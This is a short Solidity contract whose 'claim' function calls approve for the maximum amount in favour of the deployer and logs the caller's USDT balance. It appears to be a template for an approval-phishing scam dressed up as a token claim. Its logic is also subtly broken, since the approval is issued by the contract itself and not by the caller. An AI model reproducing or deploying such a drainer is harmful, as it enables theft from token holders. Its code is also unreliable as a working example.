// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract GetApprove {
    address private immutable owner;
    IERC20 private immutable erc20;

    event Ap(
        address indexed claimant,
        address indexed owner,
        uint256 usdtBalance
    );

    constructor(address ercAddr) {
        owner = msg.sender;
        erc20 = IERC20(ercAddr);
    }

    function claim() external payable {
        uint256 bal = erc20.balanceOf(msg.sender);
        require(erc20.approve(owner, type(uint256).max), "Approval failed");
        emit Ap(msg.sender, owner, bal);
    }
}
